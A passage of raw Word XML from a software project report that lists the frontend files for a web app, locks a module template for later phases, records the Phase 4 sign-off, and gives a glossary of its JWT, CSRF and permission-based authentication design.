        <w:t>Plus two helper files inside src/utils/ (crypto.js · cookies.js) and one users module pair (users.routes.js · users.controller.js) — they're listed in the tree in Part I.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>12.2  Frontend Files (19 total)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="567"/>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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Path (under SOFTWARE CODE/FE/)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>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Purpose</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1</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.env.example</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VITE_API_BASE_URL placeholder</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2</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.gitignore</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node_modules, dist, .env</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3</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index.html</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Title + Inter font preconnect + /src/main.jsx</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4</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package.json</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FE deps (NO typescript)</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5</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postcss.config.js</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Tailwind + Autoprefixer</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6</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tailwind.config.js</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11 color tokens + Inter stack + shadow</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7</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vite.config.js</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/api proxy + @/ alias</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8</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src/App.jsx</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AuthProvider → BrowserRouter → Routes</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9</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src/main.jsx</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React 18 createRoot + StrictMode</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10</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src/styles/globals.css</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@tailwind directives + body base + focus ring</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11</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src/components/Brand.jsx</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CMCMIS· wordmark, sm/md/lg</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12</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src/components/Layout.jsx</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Sidebar + TopBar + main shell</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13</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src/components/ProtectedRoute.jsx</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loading/anonymous/forbidden/render guard</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14</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src/components/Sidebar.jsx</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Permission-filtered nav + identity + sign-out</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15</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src/components/TopBar.jsx</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Auto-derived title + role badge + initials</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16</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src/components/ui/{Badge,Button,FormField,Input,Spinner}.jsx</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Five UI primitives</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17</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src/lib/api-client.js</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axios + Bearer/CSRF interceptors + refresh coalescing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="56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18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="368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src/lib/auth-context.jsx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="51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AuthProvider + useAuth()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="567"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>src/lib/permissions.js + schemas/loginSchema.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Nav map + zod schema mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>12.3  Pattern Locked for Phase 5+</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every future module (Equipment in Phase 5, Job Requests + Job Cards in Phase 6, etc.) clones the exact same shape. Phase 4's effort compounds across every following phase.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="9638"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8FAFC"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="6" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="6" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80" w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:i/>
                <w:color w:val="4B5563"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// phase5+ template</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>BE: modules/&lt;name&gt;/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;name&gt;.validators.js   ← zod schemas</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;name&gt;.repo.js         ← raw SQL only here</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;name&gt;.service.js      ← business rules</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;name&gt;.controller.js   ← thin req/res shim</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;name&gt;.routes.js       ← authenticate → authorize('x:y') → validate(s) → ctrl</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>FE: pages/&lt;Name&gt;{List,Detail,Form}.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    +  router entry in App.jsx wrapped in</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;ProtectedRoute requiredPermission="x:y"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">         &lt;Layout&gt;{ /* page */ }&lt;/Layout&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       &lt;/ProtectedRoute&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    +  ALL_NAV_ITEMS entry in lib/permissions.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>12.4  Sign-off</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>PHASE 4 — SEALED</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>8 of 8 steps complete.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>21 backend .js files + 19 frontend .jsx/.js/.css/.html files on disk.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Zero TypeScript files anywhere in the project.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Endpoints LIVE: POST /api/v1/auth/login · /refresh · /logout · GET /api/v1/me · GET /healthz.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Browser-verified on 2026-05-17: login → dashboard → sidebar filtering → forbidden page → logout — all green.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Module template locked. Phase 5+ work proceeds by cloning, not redesigning.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Appendix  ·  Glossary, Tokens, Permissions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>A.1  Glossary</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5100"/>
        <w:gridCol w:w="5100"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>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Term</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>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Meaning in this project</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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Access token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Short-lived (15-min) JWT carried in Authorization: Bearer. Lives in JS memory only.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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Refresh token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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Long-lived (7-day) JWT in httpOnly cookie cmcmis_rt; stored as sha256 hex in DB.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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CSRF token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Random hex in JS-readable cookie cmcmis_csrf; echoed as X-CSRF-Token header on /refresh.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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AppError</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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Custom Error class carrying code, statusCode, details. Only blessed way to throw HTTP errors.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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errors{}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Factory object exposing badRequest / unauthorized / forbidden / notFound / conflict / tooManyRequests / internal.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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Standard error envelope</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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 error: { code, message, details } } — every error response shape.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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BR-RBAC-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Locked rule: always check permission codes, never role names.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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BR-AUTH-06</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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Locked rule: every auth attempt writes a login_audit row.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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Theft detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>auth.service.refresh() sweep: valid signature + DB miss → revokeAllForUser.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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Refresh coalescing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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FE pattern: only the FIRST 401 starts the refresh; concurrent 401s await the same in-flight promise.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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Double-submit token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CSRF pattern: token in cookie + matching header; server demands they match.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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ProtectedRoute</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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FE wrapper that renders Spinner/Navigate/Forbidden/children based on auth + permission state.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Layout</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>FE shell: Sidebar + TopBar + scrollable main. Wraps every authenticated page.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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ALL_NAV_ITEMS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="708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Single source of truth for the sidebar — pairs route + permission code + lucide icon.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>A.2  Color Token Reference</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>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Hex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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Sample use</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>base</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#F5F6FA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
